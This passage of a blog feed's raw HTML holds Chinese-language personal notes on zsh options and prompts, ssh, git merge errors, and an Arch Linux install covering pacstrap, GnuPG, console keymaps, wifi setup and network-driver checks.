<code>.zshrc</code> 里面的命名机制 – 大小写敏感且忽略下划线. 如: <code>SOME_OPTION</code> 和 <code>SOMEOPTION</code> 是同一个东西。</p><p>两个命令 – <code>setopt</code> 和 <code>unsetopt</code>:</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">setopt SOME_OPTION # enables <span class="hljs-keyword">any</span> <span class="hljs-keyword">option</span><br>unsetopt SOME_OPTION # use this <span class="hljs-keyword">to</span> <span class="hljs-keyword">disable</span> <span class="hljs-keyword">any</span> <span class="hljs-keyword">option</span><br></code></pre></td></tr></table></figure><p>在选项前面添加 <code>NO</code> 是和 <code>unsetopt</code> 一样的效果:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">setopt</span> NO_SOME_OPTION<br></code></pre></td></tr></table></figure><p>zsh 用 <code>#</code> 作为注释。</p><p>一行命令:</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs angelscript"><span class="hljs-built_in">auto</span>load -U promptinit<br></code></pre></td></tr></table></figure><p>这里的 <code>proptinit</code> 是一个模块，</p><h2 id="Shell-option"><a href="#Shell-option" class="headerlink" title="Shell option"></a>Shell option</h2><p><code>-v</code> 参数，意为 “verbose” , 它会把你输入的命令再打印一遍。</p><p><code>-f</code> 参数，会打开一个 zsh, 这个 zsh, 没有任何配置。</p><p>在已经打开的 zsh 中使用 <code>set</code> 可以设置 zsh 的参数.</p><p>用 <code>set +某个参数</code> 可以取消</p><h2 id="The-startup-files"><a href="#The-startup-files" class="headerlink" title="The startup files"></a>The startup files</h2><p>设置 zsh 查找配置文件的路径, 通过改变 <code>ZDOTDIR</code> 环境变量.</p><p>文件的优先级为:</p><ul><li>zshenv, 一般只放变量</li><li>zprofile</li><li>zshrc</li><li>zlogin</li></ul><p>如果 zsh 不是交互式, 则 <code>~/.zshrc</code> 和 <code>~/.zprofile</code> 不会被读取.</p><p>如果 zsh 不是 login shell, <code>~/.zlogin</code> 也不会被读取.</p><p>当使用 <code>logout</code> 命令时, <code>~/.zlogout</code> 文件会被读取.</p><p><code>RCS</code> 和 <code>GLOBAL_RCS</code> 这两个变量:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">unset</span> RCS <span class="hljs-comment"># disable loading of files other than zshenv</span><br><span class="hljs-built_in">unset</span> GLOBAL_RCS <span class="hljs-comment"># disable loading of files unser /etc/</span><br></code></pre></td></tr></table></figure><h2 id="The-shell-prompt"><a href="#The-shell-prompt" class="headerlink" title="The shell prompt"></a>The shell prompt</h2><h2 id="The-prompt-command"><a href="#The-prompt-command" class="headerlink" title="The prompt command"></a>The prompt command</h2><p>首先需要在 <code>.zshrc</code> 中加入:</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs angelscript"><span class="hljs-built_in">auto</span>load promptinit<br>promptinit<br></code></pre></td></tr></table></figure><p><code>prompt</code> 组件允许你选择主题.</p><p>用 <code>prompt -p</code> 查看主题.</p><p>选择主题:</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml">$ prompt <span class="hljs-tag">&lt;<span class="hljs-name">theme_name</span>&gt;</span><br></code></pre></td></tr></table></figure><p>设置 zsh 允许 inline comments:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">setopt</span> INTERACTIV_COMMNTS<br></code></pre></td></tr></table></figure><p>查看某个主题:</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml">$ prompt -h <span class="hljs-tag">&lt;<span class="hljs-name">theme_name</span>&gt;</span><br></code></pre></td></tr></table></figure><p>示例:</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs angelscript"><span class="hljs-built_in">auto</span>load -U promptinit<br>promptinit<br>prompt adaml red yellow magenta<br></code></pre></td></tr></table></figure><p>若想使用 bash 或其他的 shell 语法来定制, 见书.</p><h2 id="Customizing-the-prompt"><a href="#Customizing-the-prompt" class="headerlink" title="Customizing the prompt"></a>Customizing the prompt</h2><p>Zsh 提供了 5 种不同的 prompts, 具体见 <code>man zshmisc</code>.</p><p>主要的是 <code>$PS1</code> 或 <code>$PROMPT</code>.</p><h2 id="Using-escape-sequences"><a href="#Using-escape-sequences" class="headerlink" title="Using escape sequences"></a>Using escape sequences</h2><p>escape sequences 是一组预定义的信息的简写.</p><p>这里的转义字符前面是 <code>%</code>.</p><p>在 <code>.zshrc</code> 中添加:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">setopt</span> PROMPT_SUBST<br></code></pre></td></tr></table></figure><p>设置了这个选项会让 zsh 将 <code>$PROMPT</code> 视为普通的 shell 变量.</p><p><code>man zshmisc</code> 中的 <code>Prompt Expansion</code> 部分列出了 escape sequences.</p><h3 id="Shell-state-options"><a href="#Shell-state-options" class="headerlink" title="Shell state options"></a>Shell state options</h3><h3 id="Login-information-options"><a href="#Login-information-options" class="headerlink" title="Login information options"></a>Login information options</h3><h3 id="Directory-options"><a href="#Directory-options" class="headerlink" title="Directory options"></a>Directory options</h3><p>显示 <code>%</code> 用 <code>%%</code>.</p><h2 id="Conditional-expressions"><a href="#Conditional-expressions" class="headerlink" title="Conditional expressions"></a>Conditional expressions</h2><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs applescript">%(X.<span class="hljs-literal">true</span>-<span class="hljs-built_in">text</span>.<span class="hljs-literal">false</span>-<span class="hljs-built_in">text</span>)<br></code></pre></td></tr></table></figure><p>当 condition X 是真, 则执行 true-text, 为假, 则执行 false-text. 需要用 <code>%()</code> 包裹起来.</p><p>用来判断命令返回值可用: <code>PS1=%(?..)</code></p><h2 id="Putting-it-all-together"><a href="#Putting-it-all-together" class="headerlink" title="Putting it all together"></a>Putting it all together</h2><p>查看 zsh 源文件下的 Functions 目录, 进入 Prompts 目录, 可以看到所有的 setup function 的命名格式为 <code>prompt_&lt;theme_name&gt;_setup</code></p><p>可以通过 <code>source</code> 这些文件改变 prompt.</p><p>在 <code>zshrc</code> 中 <code>promptinit</code> 后面开始添加.</p><p>在终端右侧添加 error flag:</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">RPS1</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;%(?..(%?%))&quot;</span><br></code></pre></td></tr></table></figure><p>添加颜色用大括号如: <code>&#123;yellow&#125;</code>.</p><h1 id="2-Alias-and-History"><a href="#2-Alias-and-History" class="headerlink" title="2 Alias and History"></a>2 Alias and History</h1><h2 id="Working-with-aliases"><a href="#Working-with-aliases" class="headerlink" title="Working with aliases"></a>Working with aliases</h2><h3 id="Quoting-characters"><a href="#Quoting-characters" class="headerlink" title="Quoting characters"></a>Quoting characters</h3><p>使用 <code>\</code> 转义.</p><p>使用 <code>&#39;&#39;</code> 不能将 <code>$VAR</code> 转换成对应的值, 使用 <code>&quot;&quot;</code> 可以.</p><p>暂时取消一个 alias:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">unalias</span> &lt;aliasname&gt;</span><br></code></pre></td></tr></table></figure><p><code>command</code> 命令可以让 zsh 执行 any argument 作为外部命令而不是内建命令, 查阅 <code>man zshbuiltins</code></p><h3 id="Global-aliases"><a href="#Global-aliases" class="headerlink" title="Global aliases"></a>Global aliases</h3>]]></content>
    
    
    <categories>
      
      <category>Shell</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>ssh 使用</title>
    <link href="/2022/08/31/ssh-%E4%BD%BF%E7%94%A8/"/>
    <url>/2022/08/31/ssh-%E4%BD%BF%E7%94%A8/</url>
    
    <content type="html"><![CDATA[<p>首先需要知道一台机器的 IP 地址，以及其上面一个账户名和密码, 如:</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs elixir"><span class="hljs-variable">$ </span>ssh root<span class="hljs-variable">@ip</span><br></code></pre></td></tr></table></figure><p>然后系统会提示输入密码，密码正确就会进入.</p>]]></content>
    
    
    <categories>
      
      <category>Linux</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>fish 这一软件</title>
    <link href="/2022/08/31/fish-%E8%BF%99%E4%B8%80%E8%BD%AF%E4%BB%B6/"/>
    <url>/2022/08/31/fish-%E8%BF%99%E4%B8%80%E8%BD%AF%E4%BB%B6/</url>
    
    <content type="html"><![CDATA[<p>Fish 是 “the Friendly Interactive Shell” 的简称，其支持语法高亮，自动建议，标签完成等。</p>]]></content>
    
    
    <categories>
      
      <category>Shell</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>使用 Git 时 refusing to merge unrelated histories 解决</title>
    <link href="/2022/08/31/%E4%BD%BF%E7%94%A8-Git-%E6%97%B6-refusing-to-merge-unrelated-histories-%E8%A7%A3%E5%86%B3/"/>
    <url>/2022/08/31/%E4%BD%BF%E7%94%A8-Git-%E6%97%B6-refusing-to-merge-unrelated-histories-%E8%A7%A3%E5%86%B3/</url>
    
    <content type="html"><![CDATA[<p>原因是两个仓库不同导致，我先是新建了一个仓库，然后 <code>git add remote</code> 了一个 gitee 仓库，接着 <code>git pull</code> 下来，最后往上面直接提交了. 这导致了问题，因为不是直接 <code>git clone</code> 而来的。</p><p>先将两个仓库 <code>merge</code> 在一起就可以解决，但遇到了报错，使用 <code>--allow-unrelated-histories</code> 可以消除。</p>]]></content>
    
    
    <categories>
      
      <category>Errors</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>解决用 kvm 创建 archlinux 虚拟机时进入 UEFI Interactive Shell 问题</title>
    <link href="/2022/08/30/%E8%A7%A3%E5%86%B3%E7%94%A8-kvm-%E5%88%9B%E5%BB%BA-archlinux-%E8%99%9A%E6%8B%9F%E6%9C%BA%E6%97%B6%E8%BF%9B%E5%85%A5-UEFI-Interactive-Shell-%E9%97%AE%E9%A2%98/"/>
    <url>/2022/08/30/%E8%A7%A3%E5%86%B3%E7%94%A8-kvm-%E5%88%9B%E5%BB%BA-archlinux-%E8%99%9A%E6%8B%9F%E6%9C%BA%E6%97%B6%E8%BF%9B%E5%85%A5-UEFI-Interactive-Shell-%E9%97%AE%E9%A2%98/</url>
    
    <content type="html"><![CDATA[<p>虚拟机启动后，会自动寻找启动分区 <code>/dev/vda</code> 下面的 <code>EFI/boot/</code> 目录下的引导文件, 如 x86_64 平台的引导文件一般为 <code>bootx64.efi</code>, 而启动分区在 UEFI Interactive Shell 界面一般以 <code>FS0:</code> 的盘符存在。</p><h1 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h1><p>先进入 <code>FS0:</code> 盘符:</p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs avrasm">Shell&gt; FS0:<br><span class="hljs-symbol">FS0:</span>\&gt;<br></code></pre></td></tr></table></figure><p>查看当前文件:</p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-symbol">FS0:</span>\&gt; ls<br></code></pre></td></tr></table></figure><p>进入 <code>EFI</code> 目录:</p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-symbol">FS0:</span>\&gt; cd EFI<br></code></pre></td></tr></table></figure><p>创建 <code>boot</code> 目录并把 <code>hostname</code>(你自己设置的) 目录下的 <code>grubx64.efi</code> 复制到 <code>boot</code> 目录中并重命名为 <code>bootx64.efi</code>.</p><p>最后启动 <code>bootx64.efi</code> 文件来重启。</p>]]></content>
    
    
    <categories>
      
      <category>Arch</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>pacstrap 的使用</title>
    <link href="/2022/08/30/pacstrap-%E7%9A%84%E4%BD%BF%E7%94%A8/"/>
    <url>/2022/08/30/pacstrap-%E7%9A%84%E4%BD%BF%E7%94%A8/</url>
    
    <content type="html"><![CDATA[<p><a href="https://man.archlinux.org/man/pacstrap.8">ArchWiki</a><br>pacstrap 用于将软件包下载到 specified new root directory.</p><h1 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h1><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gams"><span class="hljs-symbol">$</span> pacstrap [<span class="hljs-keyword">option</span>] root [packages...]<br></code></pre></td></tr></table></figure><p>如果没有指定软件包，the base metapackage 会被下载。</p><p>这里的 <code>root</code> 是一个目录，如装 archlinux 时:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">pacstrap /mnt base linux linux-firmware</span><br></code></pre></td></tr></table></figure><h1 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h1><p>pacstrap is designed to create a new system installation from scratch. The specified packages will be installed into a given directory after setting up some basic mountpoints.</p>]]></content>
    
    
    <categories>
      
      <category>Arch</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>ArchWiki 中关于 GnuPG</title>
    <link href="/2022/08/30/ArchWiki-%E4%B8%AD%E5%85%B3%E4%BA%8E-GnuPG/"/>
    <url>/2022/08/30/ArchWiki-%E4%B8%AD%E5%85%B3%E4%BA%8E-GnuPG/</url>
    
    <content type="html"><![CDATA[<p><a href="https://wiki.archlinux.org/title/GnuPG">ArchWiki</a><br>GnuPG (即 GPG) 是一个自由软件，其实现了 RFC4880 所定义的 OpenPGP 标准.</p><p>GnuPG 可用于加密和签名你的数据和通讯信息, 包含一个通用的密钥管理系统以及用于各种公钥目录的访问模块。</p><h1 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h1><p>安装软件包 gnupg 时，软件包 pinentry 也会被同时安装。</p><h1 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h1><h2 id="目录位置"><a href="#目录位置" class="headerlink" title="目录位置"></a>目录位置</h2><p>默认为 <code>~/.gnupg</code>.</p><p>改变:</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gradle">$ gpg --homedir path<span class="hljs-regexp">/to/</span><span class="hljs-keyword">file</span><br></code></pre></td></tr></table></figure><p>或设置 <code>GNUPGHOME</code> 环境变量。</p><h1 id="用法"><a href="#用法" class="headerlink" title="用法"></a>用法</h1><h2 id="导出公钥"><a href="#导出公钥" class="headerlink" title="导出公钥"></a>导出公钥</h2><p>GPG 的主要用途就是通过公钥加密信息以确保其私密性，你可以分发自己的公钥，而其他人通过该公钥加密发给你的信息。</p><p>其他人需要有你的公钥才能给你发加密信息。</p><h2 id="导入公共密钥"><a href="#导入公共密钥" class="headerlink" title="导入公共密钥"></a>导入公共密钥</h2><p>要给其他人发送加密信息，或者验证他们的签名，就需要他们的公钥，通过文件 <code>public.key</code> 导入公钥到密钥环。</p>]]></content>
    
    
    <categories>
      
      <category>Arch</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>ArchWiki 中 archlinux 的安装</title>
    <link href="/2022/08/30/Archlinux%20%E7%9A%84%E5%AE%89%E8%A3%85/"/>
    <url>/2022/08/30/Archlinux%20%E7%9A%84%E5%AE%89%E8%A3%85/</url>
    
    <content type="html"><![CDATA[<p><a href="https://wiki.archlinux.org/title/Installation_guide">ArchWiki</a><br><a href="https://www.bilibili.com/read/cv15713480">参考博客</a></p><h1 id="一些知识点"><a href="#一些知识点" class="headerlink" title="一些知识点"></a>一些知识点</h1><p>Arch Linux 现在只支持 x86_64(即 amd64) 架构.</p><p>Arch Linux 的发布版本只是安装和修复环境，包含 base 元软件包和一些辅助软件，一般每月上旬发布一次。</p><p>使用 <code>pacman -Syu</code> 命令升级系统。</p><p>新功能通过 <code>pacman -Syu</code> 即可拥有。</p><p><code>pacman -Qs</code> 可用于查找包.</p><p><a href="https://wiki.archlinux.org/title/System_maintenance">提高系统稳定性</a></p><p>Arch Linux 安装镜像不支持安全启动 (Secure Boot).</p><p>虚拟控制台默认的 Shell 是 Zsh.</p><p>如果要清除原来的分区信息, 通过创建一个新的分区表, 利用 <code>fdisk</code>.</p><p>BIOS with MBR.</p><p>UEFI with GPT.</p><p>如果要启动的磁盘已经有一个 EFI 系统分区，不要新建 EFI 分区。</p><p>如果要创建一个 EFI 系统分区，使用 <code>mkfs.fat)8</code> 将其格式化为 Fat32.</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gradle"># mkfs.fat -F <span class="hljs-number">32</span> <span class="hljs-regexp">/dev/</span>efi_system_partition<br></code></pre></td></tr></table></figure><p>挂载分区一定要遵循顺序，先挂载 (root) 分区到 (&#x2F;mnt), 再挂载引导 (boot) 分区到 (&#x2F;mnt&#x2F;boot 或 &#x2F;mnt&#x2F;efi), 最后再挂载其他分区。</p><p>如果创建了交换空间卷，使用 <code>swapon</code> 启动它:</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gradle"># swapon <span class="hljs-regexp">/dev/</span>swap_partition<br></code></pre></td></tr></table></figure><p>文件 <code>/etc/pacman.d/mirrorlist</code> 定义了软件包会从哪个镜像下载.<br>安装必需得软件包:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">pacstrap /mnt base linux linux-firmware</span><br></code></pre></td></tr></table></figure><p>在虚拟机或容器中安装时，可以不安装固件软件包 (即 linux-firmware).</p><p>这里安装 <code>base-devel</code> 可能更好。</p><p>要生成文件系统表，用于在系统启动时自动挂载分区。</p><p>注意b站那个教程装 kde 桌面时，软件包是 <code>kde-applications-meta</code>.</p><h1 id="自己安装的全过程-综合多个安装教程-并在虚拟机上实验"><a href="#自己安装的全过程-综合多个安装教程-并在虚拟机上实验" class="headerlink" title="自己安装的全过程 (综合多个安装教程, 并在虚拟机上实验)"></a>自己安装的全过程 (综合多个安装教程, 并在虚拟机上实验)</h1><h2 id="修改命令行字体"><a href="#修改命令行字体" class="headerlink" title="修改命令行字体"></a>修改命令行字体</h2><p>修改命令行的字体，其字体文件存放在 <code>/usr/share/kbd/consolefonts</code> 下:</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gradle"># setfont <span class="hljs-regexp">/usr/</span>share<span class="hljs-regexp">/kbd/</span>consolefonts/LatGrkCyr-<span class="hljs-number">12</span>x22.psfu.gz<br></code></pre></td></tr></table></figure><p>这个字体较大.</p><h2 id="修改键盘布局"><a href="#修改键盘布局" class="headerlink" title="修改键盘布局"></a>修改键盘布局</h2><p>使用 <code>loadkeys</code> 命令，如:</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c"><span class="hljs-meta"># loadkeys colemak</span><br></code></pre></td></tr></table></figure><h2 id="修改键位"><a href="#修改键位" class="headerlink" title="修改键位"></a>修改键位</h2><p>查看所有的 keycode, 使用 <code>dumpkeys</code> 命令:</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">dumpkeys -l</span><br></code></pre></td></tr></table></figure><p>文件名任意，如 <code>keys.conf</code>，其目的是写一个键盘的配置文件:</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-comment"># keys.conf</span><br><span class="hljs-attribute">keycode</span> <span class="hljs-number">1</span> = Caps_Lock # <span class="hljs-number">1</span> 原本是 Escape 键的 keycode<br><span class="hljs-attribute">keycode</span> <span class="hljs-number">58</span> = Escape<br></code></pre></td></tr></table></figure><p>然后用 <code>loadkeys</code> 加载一下配置文件.</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim"># loadkeys <span class="hljs-built_in">keys</span>.<span class="hljs-keyword">conf</span><br></code></pre></td></tr></table></figure><h2 id="查看启动方式"><a href="#查看启动方式" class="headerlink" title="查看启动方式"></a>查看启动方式</h2><p>如果不是 UEFI 启动方式则装不了 arch.</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">ls <span class="hljs-regexp">/sys/</span>firmware<span class="hljs-regexp">/efi/</span>efivars<br></code></pre></td></tr></table></figure><h2 id="连接网络设备"><a href="#连接网络设备" class="headerlink" title="连接网络设备"></a>连接网络设备</h2><p>先通过 <code>ip link</code> 查看网络设备, 然后用 <code>ip link set &lt;name&gt; up</code> 连接</p><p>这里可能会有 <code>RTNETLINK answers: Operation not possible due to RF-kill</code> , 原因是网卡被警用，解决方法:</p><p>使用 <code>rfkill</code> 命令, 先查看当前状态:</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">rfkill list</span> <br></code></pre></td></tr></table></figure><p>unblock 硬件:</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">rfkill</span> unblock 设备号或名<br></code></pre></td></tr></table></figure><h3 id="使用-wpa-supplicant"><a href="#使用-wpa-supplicant" class="headerlink" title="使用 wpa_supplicant"></a>使用 wpa_supplicant</h3><h4 id="扫描当前-wifi"><a href="#扫描当前-wifi" class="headerlink" title="扫描当前 wifi"></a>扫描当前 wifi</h4><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c"><span class="hljs-meta"># iwlist wlan0 scan</span><br></code></pre></td></tr></table></figure><p>这里的 <code>wlan0</code> 是设备.</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c"><span class="hljs-meta"># iwlist wlan0 scan | grep ESSID </span><br></code></pre></td></tr></table></figure><p>可以列出 wifi 名列表. 这里 <code>ESSID</code> 的含义就是 wifi 名.</p><h4 id="连接-wifi"><a href="#连接-wifi" class="headerlink" title="连接 wifi"></a>连接 wifi</h4><p>使用 <code>wpa_passphrase</code>.</p><p>格式:</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"># wpa_passphrase <span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-name">passwd</span>&gt;</span> &gt; <span class="hljs-tag">&lt;<span class="hljs-name">filename</span>&gt;</span><br></code></pre></td></tr></table></figure><p>如:</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c"><span class="hljs-meta"># wpa_passphrase CW_WIFI 12345678 &gt; internet.conf</span><br></code></pre></td></tr></table></figure><p>用 <code>wpa_supplicant</code> 利用配置文件连接网络:</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c"><span class="hljs-meta"># wpa_supplicant -c internet.conf -i wlan0 &amp;</span><br></code></pre></td></tr></table></figure><p><code>-c</code> 选项指定配置文件，<code>-i</code> 选项指定设备. 这里的 <code>&amp;</code> 是放在后台运行.</p><p>连接之后需动态获取一个 IP 地址。</p><h3 id="使用-iwctl"><a href="#使用-iwctl" class="headerlink" title="使用 iwctl"></a>使用 iwctl</h3><figure class="highlight dsconfig"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs dsconfig"><span class="hljs-string">iwctl</span> <br>[<span class="hljs-string">iwd</span>] <span class="hljs-string">device</span> <span class="hljs-string">list</span><br>[<span class="hljs-string">iwd</span>] <span class="hljs-string">station</span> &lt;<span class="hljs-string">device</span>&gt; <span class="hljs-string">scan</span><br>[<span class="hljs-string">iwd</span>] <span class="hljs-string">station</span> &lt;<span class="hljs-string">device</span>&gt; <span class="hljs-built_in">get-networks</span><br>[<span class="hljs-string">iwd</span>] <span class="hljs-string">station</span> &lt;<span class="hljs-string">device</span>&gt; <span class="hljs-string">connect</span> &lt;<span class="hljs-string">wifi</span> <span class="hljs-string">name</span>&gt;<br>[<span class="hljs-string">iwd</span>] <span class="hljs-string">quit</span><br></code></pre></td></tr></table></figure><h3 id="动态获取-IP-地址"><a href="#动态获取-IP-地址" class="headerlink" title="动态获取 IP 地址"></a>动态获取 IP 地址</h3><p>使用 <code>dhcpcd</code>:</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c"><span class="hljs-meta"># dhcpcd &amp;</span><br></code></pre></td></tr></table></figure><p>还是放在后台运行.</p><h3 id="若无法连接网络"><a href="#若无法连接网络" class="headerlink" title="若无法连接网络"></a>若无法连接网络</h3><p>具体情况为 <code>wlan0</code> 这个设备消失了，听 LUG 群里面说是没有安装网卡驱动。</p><p>暂时解决方法为，使用启动盘，然后 <code>arch-chroot</code> 上去后操作.</p><p>另一个方法就是插网线.</p><p>在已经安装好的系统中，<code>iwlist</code> 这个命令用不了，因为没有安装，因此需要:</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">pancman -S wireless_tools</span><br></code></pre></td></tr></table></figure><h4 id="查看网卡型号"><a href="#查看网卡型号" class="headerlink" title="查看网卡型号"></a>查看网卡型号</h4><p>利用 lspci:</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c">lspci <span class="hljs-string">| grep -i ethernet</span><br></code></pre></td></tr></table></figure><p>比如我的输出为:</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">07</span>:<span class="hljs-number">00</span>.<span class="hljs-number">0</span> Ethernet controller: Realtek Semiconductor Co., Ltd. RTL8111/<span class="hljs-number">8168</span>/<span class="hljs-number">8411</span> PCI Express Gigabit Ethernet Controller (rev <span class="hljs-number">15</span>)<br></code></pre></td></tr></table></figure><p>这里 Realtek Semiconductor 是公司名. <code>RTL8111/8168/8411</code> 就是网卡型号.</p><p>看无线网卡应该为 <code>Network controller</code>. <a href="https://www.intel.ca/">intel</a></p><h4 id="查看网卡驱动以及版本号"><a href="#查看网卡驱动以及版本号" class="headerlink" title="查看网卡驱动以及版本号"></a>查看网卡驱动以及版本号</h4><p>要使 NIC 硬件正常运行，必须给电脑的 NCI 硬件设备安装对应的网卡驱动程序.</p><h5 id="使用-dmesg-和-modinfo"><a href="#使用-dmesg-和-modinfo" class="headerlink" title="使用 dmesg 和 modinfo"></a>使用 dmesg 和 modinfo</h5><p>使用 dmesg (display message) 命令查看, 这个命令用于显示开机信息，开机的信息也保存在 <code>/var/log</code> 中. 内核在引导期间会加载必要的硬件驱动程序，因此 dmesg 命令的输出中会存在是否安装了以太网卡驱动程序的信息.</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c">dmesg <span class="hljs-string">|grep NIC </span><br></code></pre></td></tr></table></figure><p>使用 <code>modinfo</code> 命令查看版本号, 格式为:</p><figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sqf">modinfo &lt;<span class="hljs-built_in">driver</span> <span class="hljs-built_in">name</span>&gt;<br></code></pre></td></tr></table></figure><h5 id="使用-ethtool-查看"><a href="#使用-ethtool-查看" class="headerlink" title="使用 ethtool 查看"></a>使用 ethtool 查看</h5><p>可能需要先安装，在 Ubuntu 中:</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">sudo apt-<span class="hljs-built_in">get</span> install ethtool<br></code></pre></td></tr></table></figure><p>使用 ethtool (ethernet tool) 来查看网卡名对应的网卡驱动名以及网卡驱动版本号, 格式为:</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml">ethtool -i <span class="hljs-tag">&lt;<span class="hljs-name">NIC</span> <span 